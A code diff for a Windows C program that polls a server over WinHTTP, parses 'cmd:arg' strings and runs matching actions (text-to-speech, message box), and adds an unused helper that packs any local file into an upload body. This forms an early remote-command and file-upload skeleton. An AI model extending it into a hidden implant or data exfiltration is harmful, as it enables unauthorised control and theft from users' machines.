@@ -1,7 +1,5 @@
 #include "winhttpclientc.h"
 #include <stdio.h>
-
-// #include <string.h>
 #include <wchar.h>
 #include <windows.h>
 #include <string.h>
@@ -81,7 +79,83 @@ void infobox(sds a, sds b){
         printf("Error!!!!!!");
 
 }
-    
+
+
+
+
+
+/* =========================
+   تنظیمات
+   ========================= */
+#define BOUNDARY "----AHOORA_BOUNDARY_778899"
+
+/* =========================
+   Prototype ها
+   ========================= */
+void WinHttpInit();
+int SendHttpRequest(
+    const wchar_t *httpVerb,
+    wchar_t *url,
+    unsigned char *sendbuf,
+    int sendbuflen,
+    char *output,
+    BOOL proxyFlah
+);
+
+
+/* =========================
+   ساخت multipart/form-data
+   ========================= */
+unsigned char* build_multipart(
+    const char* filepath,
+    int* out_len
+) {
+    FILE* f = fopen(filepath, "rb");
+    if (!f) return NULL;
+
+    fseek(f, 0, SEEK_END);
+    long filesize = ftell(f);
+    fseek(f, 0, SEEK_SET);
+
+    unsigned char* filebuf = malloc(filesize);
+    fread(filebuf, 1, filesize, f);
+    fclose(f);
+
+    char header[512];
+    int header_len = sprintf(
+        header,
+        "--%s\r\n"
+        "Content-Disposition: form-data; name=\"file\"; filename=\"upload.bin\"\r\n"
+        "Content-Type: application/octet-stream\r\n\r\n",
+        BOUNDARY
+    );
+
+    char footer[128];
+    int footer_len = sprintf(
+        footer,
+        "\r\n--%s--\r\n",
+        BOUNDARY
+    );
+
+    int total = header_len + filesize + footer_len;
+    unsigned char* body = malloc(total);
+
+    memcpy(body, header, header_len);
+    memcpy(body + header_len, filebuf, filesize);
+    memcpy(body + header_len + filesize, footer, footer_len);
+
+    free(filebuf);
+
+    *out_len = total;
+    return body;
+}
+
+/* =========================
+   MAIN
+   ========================= */
+
+
+
 int main (){
     //get
     // wchar_t *url =L"http://httpbin.org/get";
@@ -159,21 +233,22 @@ int main (){
     WinHttpInit();
     SendHttpRequest(L"GET",url,NULL,0,man,FALSE);
     man[strcspn(man, "\r\n")] = 0;
-    if (strcmp(man, "001")==0)
-   {
-        speak("hack");
-        // printf("%s",man);
-   }else if (strcmp(man, "002")==0)
-   {
-         infobox("ahoora","0111");
-   }
-   
-   
-   else
-   {
-         printf("%s","wrong");
-   }
-   
+     // مثال ورودی: 002:txt1:txt2
+    char *cmd  = strtok(man, ":");
+    char *arg1 = strtok(NULL, ":");
+    char *arg2 = strtok(NULL, ":");
+
+    /* ================== Logic ================== */
+
+    if (cmd && strcmp(cmd, "001") == 0) {
+            speak(arg1);
+    }
+    else if (cmd && strcmp(cmd, "002") == 0) {
+            infobox(arg1, arg2);
+    }
+    else {
+        printf("unknown command: %s\n", cmd ? cmd : "NULL");
+    }
     
     
     return 0;
